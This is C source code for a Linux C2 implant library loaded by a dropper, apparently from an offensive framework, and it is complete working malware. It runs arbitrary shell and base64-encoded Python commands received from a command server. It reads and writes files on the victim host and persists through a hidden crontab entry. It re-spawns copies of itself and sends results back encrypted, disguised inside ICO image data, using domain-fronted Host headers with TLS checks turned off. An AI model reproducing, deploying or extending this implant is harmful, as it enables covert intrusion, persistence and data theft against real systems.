/*
 * Implant
 *
 * This file contains the core implant code, designed to be loaded by the dropper executable
 *
 * It should be compiled to produce a PIC shared library
 *
 */
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <stdlib.h>
#include <signal.h>
#include <curl/curl.h>
#include "stage2core.h"
#include "common.h"
#include "base64.h"
#include <pwd.h>
#include <uzlib.h>
#include <sys/stat.h>
#include <sys/stat.h>
#include <errno.h>
#include <spawn.h>
#include "syscall.h"
#include <fcntl.h>
#include <time.h>
#include <sys/wait.h>


#define NO_PREPEND_COMMAND 0
#define PREPEND_COMMAND 1
#define NO_CAPTURE_STDERR 0
#define CAPTURE_STDERR 1

struct config *config;

generic_fp *_func_table;

extern char **__environ;

pid_t child_pid;
int child_status;
int child_status_retrieved = 0;
int child_killed = 0;

uint process_timeout = 120;

unsigned int timestring_to_seconds(char *p) {
	unsigned int t;
	t = atoi(p);
	// now need to see what the units were
	if (strstr(p, "h")) {
		t = t * 60 * 60;
	} else if (strstr(p, "m")) {
		t = t * 60;
	} 
	return t;
}

// alarm handler
static void handle_process_timeout(int signo) {
	dprintf("%s", "Process timeout exceeded, interrupting child process\n");
	// Check process is running. Small risk that PID has been reused, or that it exits before we call killpg, but our timeout is short so reuse unlikely
	if (kill(child_pid, 0) == 0) {
		child_killed = 1;
		// because we used our own __popen we set the process group == pid, we can killpg with the PID we were given
		killpg(child_pid, SIGINT);
		dprintf("%s", "Waiting for child to quit...\n");

		struct timespec req, rem;
		req.tv_sec  = 2;
		req.tv_nsec = 0;
		nanosleep(&req, &rem);

		if (kill(child_pid, 0) == 0) {
			dprintf("%s", "Still running, sending sigkill\n");
			killpg(child_pid, SIGKILL);
		}
	}
}

// sigchild hander
static void handle_process_exit(int signo){
	pid_t pid;
	int status;
	pid = wait(&status);
	dprintf("Child exited - pid: %d, status: %d\n", pid, WEXITSTATUS(status));
	child_pid = pid;
	child_status = WEXITSTATUS(status);
	child_status_retrieved = 1;
}

// our own implementation of popen. This allows:
//  - pid to be recorded for later use
//  - a pair of pipes, one connected to the child's stdout, the other to stderr
//  we're expecting to get a pointer to an array of two pointers to int[2] arrays, one for each pipe
int __popen(char **argv, int **pipes, pid_t *pid)
{
	// setup our pipes using the array we were passed
	int *stdout_pipe = pipes[0];
	int *stderr_pipe = pipes[1];	

	if (pipe(stdout_pipe) < 0) {
		dprintf("%s", "Unable to init stdout pipe\n");
		return -1;
	}

	if (pipe(stderr_pipe) < 0) {
		dprintf("%s", "Unable to init stderr pipe\n");
		return -1;
	}

	// set the pipes to be non-blocking on read so we can read from both at once
	fcntl(stdout_pipe[0], F_SETFL, O_NONBLOCK);
	fcntl(stderr_pipe[0], F_SETFL, O_NONBLOCK);
	
	if ((*pid = fork()) < 0 ) {
		dprintf("%s", "Unable to fork \n");
	} else if (*pid == 0) {
		// child
		
		// Close read ends of pipes
		close(stdout_pipe[0]);
		close(stderr_pipe[0]);

		// attach the other end of the pipe to stdout/stderr
		if (stdout_pipe[1] != STDOUT_FILENO) {
			if (dup2(stdout_pipe[1], STDOUT_FILENO) != STDOUT_FILENO) {
				dprintf("%s", "Unable to attach stdout\n");
				exit(1);
			}
		}

		if (stderr_pipe[1] != STDERR_FILENO) {
			if (dup2(stderr_pipe[1], STDERR_FILENO) != STDERR_FILENO) {
				dprintf("%s", "Unable to attach stderr\n");
				exit(1);
			}
		}
		
		// set our process group to be the same as our pid, this means we can kill our command and all it's children lateron
		pid_t my_pid = getpid();
		setpgid(my_pid, my_pid);

		execvp(argv[0], argv);

		exit(0);

	} else {
		//parent 
		
		// close write ends of pipes
		close(stdout_pipe[1]);
		close(stderr_pipe[1]);

		// setup signal to timeout the process
		dprintf("Setting alarm for %d seconds...\n", process_timeout);
		signal(SIGALRM, handle_process_timeout);
		signal(SIGCHLD, handle_process_exit);
		alarm(process_timeout);
		return 0;

	}
	return 0;
}

char *set_response(const char *prefix, const char *msg, size_t *response_len) {
	char *response = NULL;
	if (prefix && msg) {
		response = malloc(strlen(prefix) + strlen(msg) + 1);
		strcpy(response, prefix);
		strcat(response, msg);
	} else if (msg) {
		response = strdup(msg);
	}
       	else if (prefix) {
		response = strdup(prefix);
	} else {
		response = "";
	}

	*response_len = strlen(response);

	return response;
}


// Write our executable somewhere
// file_name should be a  format string suitable for mkstemp (i.e. ending XXXXXX)
int write_exe(char *file_name) {
	FILE *source, *dest;
	unsigned char buf[1024];
	int file_name_fd;

        file_name_fd = mkstemp(file_name);
	if (file_name_fd == -1) {
		return -1;
	}

        dprintf("Writing myself to file: %s\n", file_name);

        // copy my exe file
        source = fopen("/proc/self/exe", "rb");
        if (!source) {
		return -1;
        }

        dest = fdopen(file_name_fd, "wb");
        if (!dest) {
		return -1;
        }

        while (fread(&buf, sizeof(buf), 1, source) == 1 ) {
                if (fwrite(&buf, sizeof(buf), 1, dest)!=1) {
			return -1;
		};
        }

        fclose(source);
        fclose(dest);
        close(file_name_fd);

        int status = chmod(file_name, S_IRWXU);

	return status;

}

int run_cmd(char *cmd, char **response, size_t *response_len, int capture_stderr, int prepend_command) {
	// TODO error handling in this function (e.g. returning -1)
	// TODO make sure cmd is null terminated?
	char truncation_msg[] = "\n--TRUNCATED--\n";
	//char *redir_cmd = NULL;
	size_t max_resp_len = 100000; // TODO what's the best value for this?
	size_t response_allocated = strlen(cmd) + 2048;
	dprintf("Running command: %s\n", cmd);

	*response = malloc(response_allocated); // FREE 
	if (!response) {
		return -1;
	}
	
	if (prepend_command == PREPEND_COMMAND) {
		snprintf(*response, response_allocated, "> %s \n", cmd);
		*response_len = strlen(*response);
	} else {
		snprintf(*response, response_allocated, "> \n");
		*response_len = strlen(*response);
	}

	dprintf("response len: %d\n", *response_len);

#ifdef DEBUG
	hexdump("Response: ", (unsigned char *)*response, strlen(*response));
#endif

	char *argv[4] = {NULL};

	// cmd is a space delimited command (as you'd type on the command line)
	// we want to pass it via a shell so we don't have to parse the command into an argv vector
	
	argv[0] = "/bin/sh";
	argv[1] = "-c";
	argv[2] = cmd;

	int stdout_pipe[2], stderr_pipe[2];
	int *pipes[2];
	pipes[0] = &stdout_pipe[0];
	pipes[1] = &stderr_pipe[0];
	
	child_status_retrieved = 0;
	child_killed = 0;
	// call our own implementation of popen, as that allows us to get the child pid back. 
	// an alarm is set in __popen to timeout the child process
	int status = __popen(argv, pipes, &child_pid);

	dprintf("Got child PID %d", child_pid);
	// TODO set meaningful error messages
	if (status != 0) {
		dprintf("%s", "Failed to run command\n");
		return -1;
	}
	int buf_size = 2048;
	char buf[buf_size];

	char stdout_buf[max_resp_len];
	//char *stdout_buf_ptr = stdout_buf;
	int nread_stdout = 0;
	int stdout_buf_len = 0;
	int stdout_truncated = 0;
		
	char stderr_buf[max_resp_len];
	//char *stderr_buf_ptr = stderr_buf;
	int nread_stderr = 0;	
	int stderr_buf_len = 0;
	int stderr_truncated = 0;

        memset(stderr_buf, 0, max_resp_len);
        memset(stdout_buf, 0, max_resp_len);

	while (1) {

		if (capture_stderr == CAPTURE_STDERR) {
			nread_stderr = read(stderr_pipe[0], buf, buf_size);

			if (nread_stderr == -1) {
				if (errno != EAGAIN) {
					// an error reading from the pipe
					return -1;
				}
			}

			// we ignore nread == 0 (pipe closed) because we want to read stdout below
			// otherwise add to buffer
			if (nread_stderr > 0) {
				if (stderr_buf_len < max_resp_len) {
					memcpy(&stderr_buf[stderr_buf_len], buf, nread_stderr);
					stderr_buf_len += nread_stderr;
				} else {
					stderr_truncated = 1;
				}
			}
		}

		// we always want stdout

		nread_stdout = read(stdout_pipe[0], buf, buf_size);

		if (nread_stdout == -1) {
			if (errno != EAGAIN) {
				// an error reading from the pipe
				return -1;
			}
		}

		//  add to buffer
		if (nread_stdout > 0) {
			if (stdout_buf_len <= max_resp_len-1) {
				memcpy(&stdout_buf[stdout_buf_len], buf, nread_stdout);
				stdout_buf_len += nread_stdout;
			} else {
				stdout_truncated = 1;
			}
		}
		
		if ((capture_stderr == CAPTURE_STDERR && nread_stderr == 0) || nread_stdout == 0) {
			dprintf("%s", "Pipe closed, finished reading from child\n");
			break;
		}

		// we use nanosleep rather than sleep because some implementations *may* rely on SIGALARM, and we are using that to timeout the process
		struct timespec req, rem;
		req.tv_sec  = 0;
		req.tv_nsec = 500000000L;
		nanosleep(&req, &rem);

	}

	dprintf("%s", "Finished reading from child, copying into response\n");

	char stderr_header[] = "--- stderr ---\n";

	// add our stderr and stdout into buffer.
	if ((capture_stderr == CAPTURE_STDERR) && (stderr_buf_len > 0)) {
		
		if (*response_len + (stderr_buf_len + strlen(stderr_header)) > response_allocated) {
			*response = realloc(*response, response_allocated + stderr_buf_len + 1 + strlen(truncation_msg)); // slightly wasteful to include the truncation message, but saves a potential realloc below
			if (*response == NULL) {
				return -1;
			}
			response_allocated += stderr_buf_len + 1 + strlen(truncation_msg);
		}
		memcpy(*response + *response_len, stderr_header, strlen(stderr_header));
		*response_len += strlen(stderr_header);
		memcpy(*response + *response_len, stderr_buf, stderr_buf_len);
		*response_len += stderr_buf_len;
		if (stderr_truncated == 1) {
			memcpy(*response, truncation_msg, strlen(truncation_msg));
			*response_len += strlen(truncation_msg);

		}
	}
	char stdout_header[] = "\n--- stdout ---\n";
	if (stdout_buf_len > 0) {
		if (*response_len + (stdout_buf_len + strlen(stdout_header)) > response_allocated) {
			*response = realloc(*response, response_allocated + stdout_buf_len + 1 + strlen(truncation_msg));
			if (*response == NULL) {
				return -1;
			}
			response_allocated += stdout_buf_len + 1 + strlen(truncation_msg);
		}
		memcpy(*response + *response_len, stdout_header, strlen(stdout_header));
		*response_len += strlen(stdout_header);
		memcpy(*response + *response_len, stdout_buf, stdout_buf_len);
		*response_len += stdout_buf_len;
		if (stdout_truncated == 1) {
			memcpy(*response, truncation_msg, strlen(truncation_msg));
			*response_len += strlen(truncation_msg);
		}
	}

	//cancel our alarm since we've returned from child process
	alarm(0);

	// add in message if child was killed
	if (child_killed == 1) {
		char killed_message[] = "\n--- Timeout exceeded, child killed\n";
		size_t size = snprintf(NULL, 0, killed_message, child_pid, child_status);
		
		if (*response_len + size >= response_allocated) {
			*response = realloc(*response, response_allocated + size + 1);
			response_allocated += size + 1;
		}

		snprintf(*response + *response_len, size, killed_message, child_pid, child_status);
		*response_len += size;

	}

	// add child exit status in
	// TODO call wait here?
	if (child_status_retrieved == 1) {
		char status_message[] = "\n--- Child %d exited with status %d\n";
		size_t size = snprintf(NULL, 0, status_message, child_pid, child_status);
		
		if (*response_len + size >= response_allocated) {
			*response = realloc(*response, response_allocated + size + 1);
			response_allocated += size + 1;
		}

		snprintf(*response + *response_len, size, status_message, child_pid, child_status);
		*response_len += size;
	}
	// make sure our response is null terminated - no guarantee what is returned from processes' stdout will be
	if (*response_len+1 >= response_allocated) {
		*response = realloc(*response, response_allocated + 10);
		response_allocated += 10;
	}
	(*response)[*response_len] = '\0';

	dprintf("FINAL RESP: %s\n", *response);
#ifdef DEBUG
	hexdump("FINAL: ", (unsigned char *)*response, *response_len);
#endif

	return 0;
}

int run_python(char *cmd, char **response, size_t **response_len) {
	// extract pycode from command, execute. 
	//
	char delim[] = "-pycode "; // trailing space is important
	char py_prefix[] = "python - << EOF\n";
	char py_suffix[] = "EOF";
	char *p; 
	char *delim_ptr;
	
	p = cmd;
	delim_ptr = delim;
	// expecting a command in the format 'runpython -pycode <b64_enc_python>'
	// This loop seeks to the start of the b64 string (e.g. end of '-pycode ')
	do {
		if (*p == *delim_ptr){
			delim_ptr++;
		} else {
			p += delim_ptr - delim;
			delim_ptr = delim;
		}
		p++;
	} while ( *delim_ptr != '\0' && *p != '\0'); 
	// at this point, p should point to the start of the base64 encoded string
	// but it could also be at the end of line if command not properly formed
	if (*p != '\0') {
		size_t code_len;
		unsigned char *raw_code = base64_decode((unsigned char *)p, strlen(p), &code_len);  // FREE
		if (!raw_code) {
			return -1;
		}	
		char *cmd = malloc(strlen(py_prefix) + strlen(py_suffix) + code_len + 1); // FREE
		if (!cmd) {
			return -1;
		}
		strcpy(cmd, py_prefix);
		memcpy(cmd+strlen(py_prefix), raw_code, code_len);
		cmd[strlen(py_prefix) + code_len] = '\0';
		strcat(cmd, py_suffix);
		
		int status = run_cmd(cmd, response, *response_len, NO_CAPTURE_STDERR, NO_PREPEND_COMMAND);

		free(raw_code);
		free(cmd);

		return status;

	} else {
		return -1;
	}
}

int start_another_implant(int keepfile) {
	int status=0;
       	int rm_status=0;
	char file_template[] = "/tmp/.XXXXXX";	
	
	if (write_exe(file_template) == -1) {
		return status;
	}

	dprintf("Wrote exe to %s", file_template);

	status = system(file_template);
	if (status == -1) {
		return status;
	}

	if (keepfile != 1) {
		rm_status = remove(file_template);
		if (rm_status == -1) {
			return rm_status;
		}
	}

	return status;
}

int remove_persist_cron(void) {
	char cmd[] = "crontab -l | { cat;  } | grep -v '\\.psh_'| crontab -";

	int status = system(cmd);
	return status;
}

int persist_cron(void) {
	int status;
        char cmd_start[]="crontab -l | { cat; echo '* 10 * * * ";
        char cmd_end[]="';} | crontab -";
	char filename_template[] = "/.psh_XXXXXX";
	char *file_dir = NULL;
	char *file_name = NULL;
	char *cmd = NULL;
        char *home_dir = getenv("HOME");
	struct passwd *pw;

        dprintf("\n\nFound homedir %s\n", home_dir);
	if (home_dir == NULL) {
		// environment variable not set. 
		// Read from passwd file
		pw = getpwuid(getuid());
		if (!pw) {
			return -1;
		}

		home_dir = pw->pw_dir;
		// if that fails, go for var tmp
		if (strlen(home_dir) == 0) {
			home_dir = strdup("/var/tmp");
		}
	}

	// the homedir will likely not have / at the end
        file_dir = malloc(strlen(home_dir) + strlen(filename_template) + 1); // FREE
	if (!file_dir) {
		return -1;
	}

        strcpy(file_dir, home_dir);
        strcat(file_dir, filename_template);

        file_dir = mkdtemp(file_dir);
	if (!file_dir) {
		return -1;
	}


        file_name = malloc(strlen(file_dir) + strlen(filename_template) + 1); // FREE
	if (!file_name) {
		return -1;
	}

        strcpy(file_name, file_dir);
        strcat(file_name, filename_template);

	write_exe(file_name);


        cmd = malloc(strlen(cmd_start) + strlen(file_name) + strlen(cmd_end)+1); // FREE
	if (!cmd) {
		return -1;
	}

        strcpy(cmd, cmd_start);
        strcat(cmd, file_name);
        strcat(cmd, cmd_end);

        dprintf("Crontab command: %s\n", cmd);

        // just use system as we don't need to capture its stdout
	status = system(cmd);

	free(file_name);	
	free(file_dir);
	free(cmd);

        return status;
}

// utility function to stitch together a random URL 
char *get_url(int *server_idx){
	*server_idx = rand() % NUM_SERVERS;
	int url_idx = rand() % NUM_URLS;
	
	char *url = malloc(strlen(SERVERCLEAN[*server_idx]) + strlen(URLS[url_idx]) + strlen(uri)+2);
	
	strcpy(url, SERVERCLEAN[*server_idx]);
	strcat(url, "/");
	strcat(url, URLS[url_idx]);
	strcat(url, uri);

	dprintf("Generated URL %s\n", url);
	return url;
}

// send response back to C2
void dispatch_response(char *response, size_t response_len, char *task_id) {
	char *host_hdr = NULL;
	char *proxy = NULL;
	dprintf("\tSending response len: %d\n", response_len);
	int server_idx;
	int attempts = 5;
	int i=0;
	char *url = get_url(&server_idx); // FREE
	dprintf("\tURL: %s\n", url);

	// generate SessionID
	size_t session_body_len;
	unsigned char *session_body = _encrypt(key, task_id, 5, &session_body_len, 1); // FREE
	char *session_cookie = malloc(session_body_len + 10); // FREE 
	strcpy(session_cookie, "SessionID=");
	strcat(session_cookie, (char *)session_body);
	session_cookie[session_body_len+strlen("SessionID=")] = '\0'; // null terminate because _encrypt may not be null terminated

	free(session_body);


#ifdef DEBUG
	hexdump("Session cookie:", (unsigned char *)session_cookie, session_body_len + strlen("SessionID=")+1);
#endif

	// select some data
	int ico_idx = rand() % NUM_ICOIMAGE;

	size_t image_len;	
	unsigned char *image_data = base64_decode(ICOIMAGE[ico_idx], sizeof(ICOIMAGE[ico_idx]), &image_len); // FREE
	
	//compress our data
	struct uzlib_comp comp = {0};
	size_t hash_size = sizeof(uzlib_hash_entry_t) * (1 << comp.hash_bits);
	comp.hash_table = malloc(hash_size); // FREE
	memset(comp.hash_table, 0, hash_size);

	zlib_start_block(&comp.out);
	uzlib_compress(&comp, (unsigned char *)response, response_len);
	zlib_finish_block(&comp.out);

	int mtime = 0;
	unsigned crc = ~uzlib_crc32(response, response_len, ~0);

	size_t compressed_output_len = 6 + sizeof(mtime) + comp.out.outlen + sizeof(crc) + sizeof(response_len);
	char *compressed_output = malloc(compressed_output_len);	 // FREE
	
	char *op_ptr = compressed_output;
	char magic1[] = {0x1f, 0x8b, 0x08, 0x00};
	char magic2[] = {0x04, 0x03};
	memcpy(op_ptr, &magic1, sizeof(magic1));
	op_ptr+=sizeof(magic1);

	memcpy(op_ptr, &mtime, sizeof(mtime));
	op_ptr+=sizeof(mtime);

	memcpy(op_ptr, &magic2, sizeof(magic2));
	op_ptr+=sizeof(magic2);

	memcpy(op_ptr, comp.out.outbuf, comp.out.outlen);	
	op_ptr += comp.out.outlen;

	memcpy(op_ptr, &crc, sizeof(crc));
	op_ptr+=sizeof(crc);

	memcpy(op_ptr, &response_len, sizeof(response_len));

#ifdef DEBUG
	hexdump("Compressed resp: ", (unsigned char *)compressed_output, compressed_output_len);
#endif
	dprintf("Compressed output length: %d\n", compressed_output_len);	

	// now we encrypt
	size_t b64_len=0;

	unsigned char *enc_response = _encrypt(key, compressed_output, compressed_output_len, &b64_len, 0);	 // FREE

#ifdef DEBUG
	hexdump("Enc response: ", enc_response, b64_len);
#endif

	// add out encrypted bit onto our image at offset 1500
	char *final_response = malloc(b64_len+1500); // FREE
	memset(final_response, 0x00, b64_len+1500);

	memcpy(final_response, image_data, 1500);
	memcpy(final_response+1500, enc_response, b64_len);

	CURL *curl = CURL_EASY_INIT();
	if (strlen(PROXY_URL) > 0) {
		proxy = get_proxy(PROXY_URL, PROXY_USER, PROXY_PASS);
		if (proxy) {
			curl_easy_setopt(curl, CURLOPT_PROXY, proxy);
		}
	}

	// set some headers
	struct curl_slist *list = NULL;
	list = CURL_SLIST_APPEND(list, "Accept-Encoding: identity");
	// I'm not sure this is needed, but we don't want curl to add it anyway
	list = CURL_SLIST_APPEND(list, "Expect:");
	if (NUM_DOMAIN_HEADERS > 0) {
		host_hdr = malloc(strlen(DOMAIN_FRONT_HEADERS[server_idx]) +strlen("Host :")+1); // FREE
		strcpy(host_hdr, "Host: ");
		strcat(host_hdr, DOMAIN_FRONT_HEADERS[server_idx]);
		list = CURL_SLIST_APPEND(list, host_hdr);
		dprintf("Set host header to  = %s\n", DOMAIN_FRONT_HEADERS[server_idx]);
	}

	CURL_EASY_SETOPT(curl, CURLOPT_POST, 1L);

	CURL_EASY_SETOPT(curl, CURLOPT_HTTPHEADER, list);
	CURL_EASY_SETOPT(curl, CURLOPT_URL, url);
	CURL_EASY_SETOPT(curl, CURLOPT_USERAGENT, UA);
	CURL_EASY_SETOPT(curl, CURLOPT_NOSIGNAL, 0L);
	CURL_EASY_SETOPT(curl, CURLOPT_SSL_VERIFYPEER, 0L);
	CURL_EASY_SETOPT(curl, CURLOPT_SSL_VERIFYHOST, 0L);

#ifdef DEBUG
	CURL_EASY_SETOPT(curl, CURLOPT_VERBOSE, 1L);
#endif
	CURL_EASY_SETOPT(curl, CURLOPT_COOKIE, session_cookie);

	   
#ifdef DEBUG
	hexdump("Final resp: ", (unsigned char *)final_response, b64_len+1500);
#endif

	CURL_EASY_SETOPT(curl, CURLOPT_POSTFIELDSIZE, b64_len+1500);
	CURL_EASY_SETOPT(curl, CURLOPT_POSTFIELDS, final_response);
	CURLcode res;

	// Try to send back to the C2 five times, to allow for glitches in the interwebs	
	i=0;	
	do {
		res = CURL_EASY_PERFORM(curl);
		i++;
		if ( res != CURLE_OK) {
			sleep(4);
		}
	} while (res != CURLE_OK && i < attempts);

	CURL_EASY_CLEANUP(curl);
	CURL_SLIST_FREE_ALL(list);


	free(compressed_output);
	free(url);
	free(final_response);
	free(enc_response);
	free(image_data);
	free(host_hdr);
	free(proxy);
}

// process a single command, extracted from the multicommand
// we expect cmd & task_id to be null terminated
void process_single_cmd(char *cmd, char *task_id) {
	char *response;
	size_t response_len=0;

	dprintf("\t Processing single cmd: %s, ID: %s\n", cmd, task_id); 

	// Check whether we know what this command is, or fall back to a shell.
	// if block MUST produce a *response and response_len value for it to be dispatched back to the C2
	// Only one if block must be matched per command
	if (strcmp(cmd, "whoami")==0) {
			dprintf("%s", "\tGetting username\n");

			struct passwd *passwd;
			passwd = getpwuid(getuid());
			dprintf("\t Username: %s\n", passwd->pw_name); 

			response = malloc(strlen(passwd->pw_name)); // FREE
			response_len = strlen(passwd->pw_name);
			strcpy(response, passwd->pw_name);

	} else if (startswith(cmd, "set-timeout")) {
		// extract timeout from cmd, C2 *should* have ensured it was formatted correctly
		// Any trailing units (e.g. S) will be ignored by atoi anyway
		char *p = strstr(cmd, " ");
		if (p) {
			process_timeout = atoi(p);
			dprintf("Set process timeout to %d\n", process_timeout);
			size_t size = snprintf(NULL, 0, "Success: set process timeout to %d\n", process_timeout);
			response = malloc(size + 1);
			snprintf(response, size, "Success: set process timeout to %d\n", process_timeout);
			response_len = strlen(response);
		} else {
			response = strdup("Error decoding set-timeout command.");
			response_len = strlen(response);
		}
	} else if (startswith(cmd, "beacon")) {
		// extract beacon (SLEEP_TIME) from cmd.
		char *p = strstr(cmd, " ");
		if (p) {
			unsigned int t = timestring_to_seconds(p);
			if (t != 0) {
				SET_SLEEP_TIME(config, t);
				size_t size = snprintf(NULL, 0, "Success: set sleep time to %d seconds\n", t);
				response = malloc(size + 1);
				if (response == NULL) {
					return;
				}
				snprintf(response, size, "Success: set sleep time to %d seconds\n", t);
				response_len = strlen(response);
			}
		} else {
				response = strdup("Error decoding beacon command.");
				response_len = strlen(response);
		}		
	} else if (startswith(cmd, "turtle")) {
		char *p = strstr(cmd, " ");
		if (p) {
			unsigned int t = timestring_to_seconds(p);
			if (t != 0) {
				sleep(t);
				response = strdup("Finished turtle sleep (yawn).");
				response_len = strlen(response);
			}
		
		} else {
				response = strdup("Error decoding turtle command.");
				response_len = strlen(response);
		}		
	
	} else if (startswith(cmd, "download-file")) {
		// send file from implant to C2
		dprintf("%s", "Downloading file!\n");
		char *filename = strstr(cmd, " ")+1;
		if (filename == NULL) {
			response = set_response(NULL, "Error - couldn't parse filename from command", &response_len);
		} else {
			dprintf("Opening file: %s\n", filename);
			FILE *fp = fopen(filename, "r");
			if (fp == NULL) {
				dprintf("Error opening file - %s\n", strerror(errno));
				response = set_response("Error opening file - ", strerror(errno), &response_len);
			} else {
				struct stat sb;
				int fd = fileno(fp);
				fstat(fd, &sb);

				if (S_ISDIR(sb.st_mode)) {
					response = set_response(NULL, "Error - is a directory", &response_len);
				} else {
					if (sb.st_mode & R_OK) { // TODO is this check necessary, or will fopen have failed?
						char chunk_info[10] = {0x00, 0x00, 0x00, 0x00, 0x31, 0x00, 0x00, 0x00, 0x00, 0x31};
						response = malloc(sb.st_size + 10);
						memset(response, 0, sb.st_size + 10);
						memcpy(response, chunk_info, 10);
						size_t bytes_read = fread(response+10, sb.st_size, 1, fp);
						dprintf("Bytes read: %d\n", bytes_read);
						if (bytes_read != 1){
							response = set_response(NULL, "Error - unable to read file", &response_len);
						}
						else {
							response_len = sb.st_size + 10;
						}
					} else {
						response = set_response(NULL, "Error - unable to read file", &response_len);
					}
				}
				fclose(fp);
			}
		}
	} else if (startswith(cmd, "upload-file")) {
		// get file from C2 to implant
		dprintf("Upload file - cmd: %s\n", cmd);	

		cmd += strlen("upload-file")+1;
		char *p = strtok(cmd, ":");
		
		char *filename = malloc(strlen(p)+1);
		strcpy(filename, p);
		dprintf("Filename: %s\n", filename);

		p = strtok(NULL, ":");
		unsigned char *file_contents_b64 = malloc(strlen(p)+1);
		strcpy((char *)file_contents_b64, p);
		printf("Contents: %s\n", file_contents_b64);
		size_t raw_size;
		unsigned char *raw_contents = base64_decode(file_contents_b64, strlen((char *)file_contents_b64), &raw_size); // free

		free(file_contents_b64);

		FILE *fp = fopen(filename, "wb");

		if (fp == NULL) {
			response = set_response("Error opening destination file - ", strerror(errno),  &response_len);
		} else {
			if (fwrite(raw_contents, raw_size, 1, fp)==1){
				response = set_response(NULL, "Uploaded file successfully", &response_len);
			} else {
				response = set_response("Error writing to destination file - ", strerror(errno), &response_len);
			};

			fclose(fp);
		}

	} else if (startswith(cmd, "persist-cron")) {
		// you might want to overwride the location the exe is stored in (e.g. onto a r/w partition). 
		// if this is the case, then you can use download-file and run your own commands to persist
		// maybe TODO - add parameter to say where to store exe
		dprintf("%s\n", "Persisting with crontab");

		// create a uniquely named file in user's home directory
		int status = persist_cron();
		if (status == -1){
			// we have an error in errnum..
			dprintf("Error persisting - %s\n", strerror(errno));
			response = set_response("Error persisting - ", strerror(errno), &response_len);
		} else {
			// we have the termination status of the child shell
			if (status==0) {
				response = set_response(NULL, "Success", &response_len);
			} else {
				response = set_response(NULL, "Error running crontab command ", &response_len);
			}
		}

	} else if (startswith(cmd, "remove-persist-cron")) {
		dprintf("%s", "Removing crontab persistence");

		int status = remove_persist_cron();
		// we have the termination status of the child shell
		if (status==0) {
			response = set_response(NULL, "Success", &response_len);
		} else {
			response = set_response(NULL, "Error running crontab command ", &response_len);
		}

	} else if (startswith(cmd, "startanotherimplant")) {
		int status;
		if (strcmp(cmd, "startanotherimplant-keepfile")) {
			status = start_another_implant(1);
		} else {
			status = start_another_implant(0);
		}

		if (status == -1) {
			response = set_response("Error starting another implant - ", strerror(errno), &response_len);
		} else {
			if (status==0) {
				response = set_response(NULL, "Success", &response_len);
			} else {
				response = set_response(NULL, "Error starting another implant ", &response_len);
			}
		}
	} else if (startswith(cmd, "runpython")) {
		size_t *rl = &response_len;
		int status = run_python(cmd, &response, &rl);
		if (status != 0) {
			response = set_response("Error running python - ", strerror(errno), &response_len);
		} 
	} else { // fallback to running with a shell
		int status = run_cmd(cmd, &response, &response_len, CAPTURE_STDERR, PREPEND_COMMAND);
		if (status != 0) {
			response = set_response("Error running command on shell - ", strerror(errno), &response_len);
		}

	}
	if (response != NULL && response_len > 0) {
		dispatch_response(response, response_len, task_id);
		free(response);
	}
	
}

// take a multicommand from the C2 and extract the subcommands for processing
void extract_cmds(char *cmd, size_t cmd_len){
	dprintf("Processing command: %.*s\n", cmd_len, cmd);
#ifdef DEBUG
	hexdump("CMD: ", (unsigned char *)cmd, cmd_len);
#endif
	char task_id[6];
	char delim[] = "!d-3dion@LD!-d"; 
	char multi[] = "multicmd";
	char *cmd_ptr = cmd;
	char *delim_ptr = delim;
	char *p;
	char *response=NULL;
	int subcommand_len = 0;
	int chars_processed=0;
	size_t response_len = 0;

	// is multicommand? If not can't handle (atm.)
	for (int i=0; i<strlen(multi); i++){
		if (cmd[i] != multi[i]) {
			dprintf("%s", "Not multicommand\n");
			size_t size = snprintf(NULL, 0, "Error - unable to parse command: %s", cmd);

			response = malloc(size + 1);
			snprintf(response, size, "Error - unable to parse command: %s", cmd);
			response_len = strlen(response);
			
			// we don't know what the task ID was as we didn't parse the command - may need to extend the C2
			dispatch_response(response, response_len, "000000");
			free(response);
			return;
		}
	}	

	cmd_ptr += strlen(multi);
	chars_processed += strlen(multi);

	dprintf("Remaining command: %*.s\n", cmd_len - strlen(multi), cmd_ptr);
	
	do {
		// get task_id (first five chars)
		strncpy(task_id, cmd_ptr, 5);
		task_id[5] = '\0';
		cmd_ptr+=5;
		chars_processed += 5;

		// find out length of command up until delim
		p = cmd_ptr;
		subcommand_len = 0;
		delim_ptr = delim;

		do {
			if (*p == *delim_ptr){
				delim_ptr++;
			} else {
				// need to update subcommand ptr with how much of the delim we've matched in case there was a partial match (e.g. a ! in command)
				// normally this should be zero.
				subcommand_len += delim_ptr - delim;
				delim_ptr = delim;
				subcommand_len++;
			}
			p++;
			chars_processed++;
		} while ( *delim_ptr != '\0' && chars_processed < cmd_len); 

		dprintf("Subcommand len = %d\n", subcommand_len);

		// create subcommand string to execute
		char *subcommand = malloc(subcommand_len + 1); // FREE
		memcpy(subcommand, cmd_ptr, subcommand_len);
		subcommand[subcommand_len] = '\0'; // make sure subcommand is null terminated as we control that, and it makes things later on
#ifdef DEBUG
		hexdump("Subcommand: ", (unsigned char *)subcommand, subcommand_len);
#endif

		// dispatch it
		process_single_cmd(subcommand, task_id);
		dprintf("Finished processing: %s\n", subcommand);
		free(subcommand);

		// delim_ptr will be null if we found a delimiter (i.e. there's another command to process)
		if (*delim_ptr == '\0') {
			cmd_ptr += subcommand_len + strlen(delim);
		} else {
			cmd_ptr += subcommand_len;
		}
	} while (cmd_ptr - cmd < cmd_len);
}


// main entry point for implant
void loopy(generic_fp *_f, struct config *config_handle){
	_func_table = _f;
	time_t curr_time;
	struct memory response;
	CURL *curl;
	CURLcode res;
	struct curl_slist *list = NULL;
	char *host_hdr = NULL;
	char *proxy = NULL;

	config = config_handle;

#ifdef DEBUG
	setvbuf(stdout, NULL, _IONBF, 0);
#endif

	// N.B. This file is not designed to be linked against libcurl - it is expecting to get its functions from the dropper
	// That's why they're all in upper case, as they're defined in common.h
	// If you want to use any more libcurl functions, you need to add them to the func_table in the dropper so they're accessible here

	// global init already done in dropper, but not sure loading process will have mapped everything
	CURL_GLOBAL_INIT(CURL_GLOBAL_ALL);

	while (1) {
		curl = CURL_EASY_INIT();

		// if a proxy was set then give it to curl
		// if not, we'll use environment variables
		if (strlen(PROXY_URL) > 0) {
			proxy = get_proxy(PROXY_URL, PROXY_USER, PROXY_PASS);
			if (proxy) {
				curl_easy_setopt(curl, CURLOPT_PROXY, proxy);
			}
		}
		
		CURL_EASY_SETOPT(curl, CURLOPT_USERAGENT, UA);

		// I'm not sure this is required, but I had some issues related to the way the implant was loaded that *may* have been signal related
		// In any case, it doesn't seem to do any harm (for now)
